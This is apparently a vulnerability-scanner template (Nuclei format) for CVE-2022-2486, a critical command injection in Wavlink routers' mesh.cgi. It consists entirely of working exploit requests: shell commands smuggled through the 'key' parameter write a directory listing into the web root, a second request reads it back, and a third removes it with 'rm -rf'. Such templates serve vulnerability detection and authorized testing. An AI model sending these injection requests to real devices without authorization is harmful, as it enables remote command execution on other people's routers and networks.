id: cve-2022-2486
info:
  name: Wavlink mesh.cgi Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    WAVLINK router mesh.cgi file has a command execution vulnerability allowing attackers to gain server privileges. Affects models WN530HG4, WN531G3, WN572HG3, WN535G3, WN575A4, etc.
  tags: [iot, command-execution]
  classification:
    cve-id: CVE-2022-2486
  metadata:
    cvss-score: 9.8
http:
  - raw:
      - |
        GET /cgi-bin/mesh.cgi?page=upgrade&key=';ls>./1.txt;' HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 500
          - 200
  - raw:
      - |
        GET /cgi-bin/1.txt HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ".cgi"
        part: body
  - raw:
      - |
        GET /cgi-bin/mesh.cgi?page=upgrade&key=';rm%20-rf%20./1.txt;' HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: status
        status:
          - 200
